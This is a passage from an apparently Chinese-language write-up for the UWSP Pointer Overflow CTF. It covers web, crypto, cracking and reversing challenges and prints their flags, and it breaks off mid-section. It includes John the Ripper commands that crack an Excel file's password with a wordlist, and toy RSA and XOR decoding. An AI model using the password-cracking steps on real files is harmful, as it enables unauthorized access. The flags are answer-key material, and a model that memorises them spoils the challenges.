+<h2 id="Vigil-of-the-Ceaseless-Eyes"><a href="#Vigil-of-the-Ceaseless-Eyes" class="headerlink" title="Vigil of the Ceaseless Eyes"></a>Vigil of the Ceaseless Eyes</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.14.51_d7k2WvqaGr.png"></p>
+<p>一个论坛</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.15.00_k14NstQ17h.png"></p>
+<p>直接访问即可</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.22.37_PqPcYTD0ky.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poctf&#123;uwsp_71m3_15_4n_1llu510n&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Quantity-is-Not-Abundance"><a href="#Quantity-is-Not-Abundance" class="headerlink" title="Quantity is Not Abundance"></a>Quantity is Not Abundance</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.48.55_j_jkKxVPWX.png"></p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://blog.csdn.net/qq_55316925/article/details/128571809" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://blog.csdn.net/qq_55316925/article/details/128571809" autofill="title,icon"><div class="left"><span class="title">https://blog.csdn.net/qq_55316925/article/details/128571809</span><span class="cap link footnote">https://blog.csdn.net/qq_55316925/article/details/128571809</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.48.32__9bE5LXKXm.png"></p>
+<p>加上Referer即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://nvstgt.com/Quantity/index.html?</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.43.42_FutWFcvJN6.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poctf&#123;uwsp_1_h4v3_70_1n5157&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Unquestioned-and-Unrestrained"><a href="#Unquestioned-and-Unrestrained" class="headerlink" title="Unquestioned and Unrestrained"></a>Unquestioned and Unrestrained</h2><p>base64</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poctf&#123;uwsp_411_y0u2_8453_423_8310n9_70_u5&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="A-Pale-Violet-Light"><a href="#A-Pale-Violet-Light" class="headerlink" title="A Pale, Violet Light"></a>A Pale, Violet Light</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e= <span class="number">5039</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">34034827</span></span><br><span class="line"></span><br><span class="line">C = <span class="number">933969</span> <span class="number">15848125</span> <span class="number">24252056</span> <span class="number">5387227</span> <span class="number">5511551</span> <span class="number">10881790</span> <span class="number">3267174</span> <span class="number">14500698</span> <span class="number">28242580</span> <span class="number">933969</span> <span class="number">32093017</span> <span class="number">18035208</span> <span class="number">2594090</span> <span class="number">2594090</span> <span class="number">9122397</span> <span class="number">21290815</span> <span class="number">15930721</span> <span class="number">4502231</span> <span class="number">5173234</span> <span class="number">21290815</span> <span class="number">23241728</span> <span class="number">2594090</span> <span class="number">21290815</span> <span class="number">18035208</span> <span class="number">10891227</span> <span class="number">15930721</span> <span class="number">202434</span> <span class="number">202434</span> <span class="number">21290815</span> <span class="number">5511551</span> <span class="number">202434</span> <span class="number">4502231</span> <span class="number">5173234</span> <span class="number">25243036</span></span><br></pre></td></tr></table></figure>
+
+<p>RSA</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,inverse</span><br><span class="line">e= <span class="number">5039</span></span><br><span class="line">N = <span class="number">34034827</span></span><br><span class="line">p=<span class="number">5807</span></span><br><span class="line">q=<span class="number">5861</span></span><br><span class="line">C = [<span class="number">933969</span>,<span class="number">15848125</span>,<span class="number">24252056</span>,<span class="number">5387227</span>,<span class="number">5511551</span>,<span class="number">10881790</span>,<span class="number">3267174</span>,<span class="number">14500698</span>,<span class="number">28242580</span>,<span class="number">933969</span>,<span class="number">32093017</span>,<span class="number">18035208</span>,<span class="number">2594090</span>,<span class="number">2594090</span>,<span class="number">9122397</span>,<span class="number">21290815</span>,<span class="number">15930721</span>,<span class="number">4502231</span>,<span class="number">5173234</span>,<span class="number">21290815</span>,<span class="number">23241728</span>,<span class="number">2594090</span>,<span class="number">21290815</span>,<span class="number">18035208</span>,<span class="number">10891227</span>,<span class="number">15930721</span>,<span class="number">202434</span>,<span class="number">202434</span>,<span class="number">21290815</span>,<span class="number">5511551</span>,<span class="number">202434</span>,<span class="number">4502231</span>,<span class="number">5173234</span>,<span class="number">25243036</span>]</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C:</span><br><span class="line">    flag+=long_to_bytes(<span class="built_in">pow</span>(i,d,N))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#poctf&#123;uwsp_533k_4nd_y3_5h411_f1nd&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Missing-and-Missed"><a href="#Missing-and-Missed" class="headerlink" title="Missing and Missed"></a>Missing and Missed</h2><p>brainfuck</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.-.------------.+++++++++++++++++.--------------.+++++++++++++++++++++.------.++.----.---.-----------------.&lt;&lt;++++++++++++++++++++.-.++++++++.&gt;&gt;+++++++++.&lt;&lt;--.&gt;&gt;---------.++++++++++++++++++++++++.&lt;&lt;-----.--.&gt;&gt;---------.&lt;&lt;+++++++++.&gt;&gt;---------------.&lt;&lt;---------.++.&gt;&gt;.+++++++.&lt;&lt;--.++.+++++++.---------.+++++++..----.&gt;&gt;++++++++.+++++++++++++++.</span><br><span class="line"></span><br><span class="line">poctf&#123;uwsp_219h7_w20n9_02_f0290773n&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h1><h2 id="We-Mighty-We-Meek"><a href="#We-Mighty-We-Meek" class="headerlink" title="We Mighty, We Meek*"></a>We Mighty, We Meek*</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2013.43.20_tz4rwZWLQ0.png"></p>
+<p>excel密码爆破</p>
+<hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">office2john crack1.xls &gt; hash.txt</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="The-Gentle-Rocking-of-the-Sun"><a href="#The-Gentle-Rocking-of-the-Sun" class="headerlink" title="The Gentle Rocking of the Sun"></a>The Gentle Rocking of the Sun</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2012.42.06_32w4N29JKy.png"></p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://crackstation.net/" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://crackstation.net/" autofill="title,icon"><div class="left"><span class="title">https://crackstation.net/</span><span class="cap link footnote">https://crackstation.net/</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2012.40.51_ydGWcJGdLZ.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zwischen</span><br></pre></td></tr></table></figure>
+
+<p>解压出来还是个嵌套的文件夹</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2012.53.03_C7X4R5SYIH.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span>= <span class="string">&#x27;2023&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    lst=os.listdir(<span class="built_in">dir</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;.DS_Store&#x27;</span> <span class="keyword">in</span> lst:</span><br><span class="line">        lst.remove(<span class="string">&#x27;.DS_Store&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> lst:</span><br><span class="line">        <span class="built_in">dir</span>= <span class="built_in">dir</span> + <span class="string">&#x27;/&#x27;</span> + lst[<span class="number">0</span>]</span><br><span class="line">        flag+=lst[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#poctf&#123;uwsp_c411f02n14_d234m1n9&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="With-Desperation-and-Need"><a href="#With-Desperation-and-Need" class="headerlink" title="With Desperation and Need*"></a>With Desperation and Need*</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2013.43.32_RJabX7PLYq.png"></p>
+<p>veracrypt加密卷爆破密码</p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Easy-as-it-Gets"><a href="#Easy-as-it-Gets" class="headerlink" title="Easy as it Gets"></a>Easy as it Gets</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">Reflection.Assembly</span>]::LoadWithPartialName(<span class="string">&quot;System.Security&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt-String</span><span class="params">(<span class="variable">$String</span>, <span class="variable">$Passphrase</span>, <span class="variable">$salt</span>=&quot;SaltCrypto&quot;, <span class="variable">$init</span>=&quot;IV_Password&quot;, [switch]<span class="variable">$arrayOutput</span>)</span></span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="variable">$r</span> = <span class="built_in">new-Object</span> System.Security.Cryptography.RijndaelManaged  </span><br><span class="line">    <span class="variable">$pass</span> = [<span class="type">Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$Passphrase</span>)  </span><br><span class="line">    <span class="variable">$salt</span> = [<span class="type">Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$salt</span>)  </span><br><span class="line">    <span class="variable">$r</span>.Key = (<span class="built_in">new-Object</span> Security.Cryptography.PasswordDeriveBytes <span class="variable">$pass</span>, <span class="variable">$salt</span>, <span class="string">&quot;SHA1&quot;</span>, <span class="number">5</span>).GetBytes(<span class="number">32</span>) <span class="comment">#256/8  </span></span><br><span class="line">    <span class="variable">$r</span>.IV = (<span class="built_in">new-Object</span> Security.Cryptography.SHA1Managed).ComputeHash( [<span class="type">Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$init</span>) )[<span class="number">0</span><span class="type">..15</span>]  </span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$r</span>.CreateEncryptor()  </span><br><span class="line">    <span class="variable">$ms</span> = <span class="built_in">new-Object</span> IO.MemoryStream  </span><br><span class="line">    <span class="variable">$cs</span> = <span class="built_in">new-Object</span> Security.Cryptography.CryptoStream <span class="variable">$ms</span>,<span class="variable">$c</span>,<span class="string">&quot;Write&quot;</span>  </span><br><span class="line">    <span class="variable">$sw</span> = <span class="built_in">new-Object</span> IO.StreamWriter <span class="variable">$cs</span>  </span><br><span class="line">    <span class="variable">$sw</span>.Write(<span class="variable">$String</span>)  </span><br><span class="line">    <span class="variable">$sw</span>.Close()  </span><br><span class="line">    <span class="variable">$cs</span>.Close()  </span><br><span class="line">    <span class="variable">$ms</span>.Close()  </span><br><span class="line">    <span class="variable">$r</span>.Clear()  </span><br><span class="line">    [<span class="built_in">byte</span>[]]<span class="variable">$result</span> = <span class="variable">$ms</span>.ToArray()  </span><br><span class="line">    <span class="keyword">return</span> [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$result</span>)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt-String</span><span class="params">(<span class="variable">$Encrypted</span>, <span class="variable">$Passphrase</span>, <span class="variable">$salt</span>=&quot;SaltCrypto&quot;, <span class="variable">$init</span>=&quot;IV_Password&quot;)</span></span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$Encrypted</span> <span class="operator">-is</span> [<span class="built_in">string</span>])&#123;  </span><br><span class="line">        <span class="variable">$Encrypted</span> = [<span class="type">Convert</span>]::FromBase64String(<span class="variable">$Encrypted</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="variable">$r</span> = <span class="built_in">new-Object</span> System.Security.Cryptography.RijndaelManaged  </span><br><span class="line">    <span class="variable">$pass</span> = [<span class="type">Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$Passphrase</span>)  </span><br><span class="line">    <span class="variable">$salt</span> = [<span class="type">Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$salt</span>)  </span><br><span class="line">    <span class="variable">$r</span>.Key = (<span class="built_in">new-Object</span> Security.Cryptography.PasswordDeriveBytes <span class="variable">$pass</span>, <span class="variable">$salt</span>, <span class="string">&quot;SHA1&quot;</span>, <span class="number">5</span>).GetBytes(<span class="number">32</span>) <span class="comment">#256/8  </span></span><br><span class="line">    <span class="variable">$r</span>.IV = (<span class="built_in">new-Object</span> Security.Cryptography.SHA1Managed).ComputeHash( [<span class="type">Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$init</span>) )[<span class="number">0</span><span class="type">..15</span>]  </span><br><span class="line">    <span class="variable">$d</span> = <span class="variable">$r</span>.CreateDecryptor()  </span><br><span class="line">    <span class="variable">$ms</span> = <span class="built_in">new-Object</span> IO.MemoryStream <span class="selector-tag">@</span>(,<span class="variable">$Encrypted</span>)  </span><br><span class="line">    <span class="variable">$cs</span> = <span class="built_in">new-Object</span> Security.Cryptography.CryptoStream <span class="variable">$ms</span>,<span class="variable">$d</span>,<span class="string">&quot;Read&quot;</span>  </span><br><span class="line">    <span class="variable">$sr</span> = <span class="built_in">new-Object</span> IO.StreamReader <span class="variable">$cs</span>  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">Write-Output</span> <span class="variable">$sr</span>.ReadToEnd()  </span><br><span class="line"></span><br><span class="line">    <span class="variable">$sr</span>.Close()  </span><br><span class="line">    <span class="variable">$cs</span>.Close()  </span><br><span class="line">    <span class="variable">$ms</span>.Close()  </span><br><span class="line">    <span class="variable">$r</span>.Clear()  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="built_in">cls</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### </span></span><br><span class="line"><span class="comment"># TODO: use strong password</span></span><br><span class="line"> <span class="comment"># Canadian_Soap_Opera </span></span><br><span class="line"><span class="comment">### </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$pwd</span> = <span class="built_in">read-host</span> <span class="string">&quot;(Case Sensitive) Please Enter User Password&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="variable">$pcrypted</span> = <span class="string">&quot;TTpgx3Ve2kkHaFNfixbAJfwLqTGQdk9dkmWJ6/t0UCBH2pGyJP/XDrXpFlejfw9d&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="built_in">write-host</span> <span class="string">&quot;Encrypted Password is: <span class="variable">$pcrypted</span>&quot;</span>  </span><br><span class="line"><span class="built_in">write-host</span> <span class="string">&quot;&quot;</span>  </span><br><span class="line"><span class="built_in">write-host</span> <span class="string">&quot;Testing Decryption of Username / Password...&quot;</span>  </span><br><span class="line"><span class="built_in">write-host</span> <span class="string">&quot;&quot;</span>      </span><br><span class="line"></span><br><span class="line"><span class="variable">$pdecrypted</span> = Decrypt<span class="literal">-String</span> <span class="variable">$pcrypted</span> <span class="variable">$pwd</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">write-host</span> <span class="string">&quot;Decrypted Password is: <span class="variable">$pdecrypted</span>&quot;</span>  </span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2015.12.42_GCMclxgzkK.png"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poctf&#123;uwsp_4d_v1c70r14m_w4573l4nd3<span class="built_in">r</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="A-Tangled-Web-We-Weave"><a href="#A-Tangled-Web-We-Weave" class="headerlink" title="A Tangled Web We Weave"></a>A Tangled Web We Weave</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">    encoded_message db 0x0F, 0x10, 0x1C, 0x0B, 0x19, 0x04, 0x0A, 0x08, 0x0C, 0x0F, 0x20, 0x14, 0x4E, 0x11, 0x46, 0x20, 0x14, 0x4F, 0x11, 0x46, 0x20, 0x46, 0x4F, 0x48, 0x20, 0x11, 0x4F, 0x48, 0x17, 0x4E, 0x11, 0x46, 0x20, 0x4F, 0x11, 0x20, 0x12, 0x4C, 0x02</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov ecx, 0</span><br><span class="line">    mov edi, encoded_message</span><br><span class="line">    find_length:</span><br><span class="line">        cmp byte [edi], 0</span><br><span class="line">        je print_message</span><br><span class="line">        inc ecx</span><br><span class="line">        inc edi</span><br><span class="line">        jmp find_length</span><br><span class="line"></span><br><span class="line">    print_message:</span><br><span class="line">        xor esi, esi</span><br><span class="line">        mov edi, encoded_message</span><br><span class="line">        decode:</span><br><span class="line">            xor eax, eax</span><br><span class="line">            mov al, byte [edi + esi]</span><br><span class="line">             xor al, ; something missing? </span><br><span class="line">            mov byte [edi + esi], al</span><br><span class="line">            inc esi</span><br><span class="line">            cmp byte [edi + esi], 0</span><br><span class="line">            jne decode</span><br><span class="line"></span><br><span class="line">        mov edx, ecx</span><br><span class="line">        mov eax, 4</span><br><span class="line">        mov ebx, 1</span><br><span class="line">        mov ecx, encoded_message</span><br><span class="line">        int 0x80</span><br><span class="line"></span><br><span class="line">    mov eax, 1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2015.15.47_ywEJrkvJsy.png"></p>
+<p>一眼异或加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poctf&#123;uwsp_k1n9_k0n9_907_n07h1n9_0n_m3&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Sunshine-on-Filth-is-Not-Polluted"><a href="#Sunshine-on-Filth-is-Not-Polluted" class="headerlink" title="Sunshine on Filth is Not Polluted"></a>Sunshine on Filth is Not Polluted</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2015.16.40_qDVym6pTQ0.png"></p>
+<p>hint为</p>
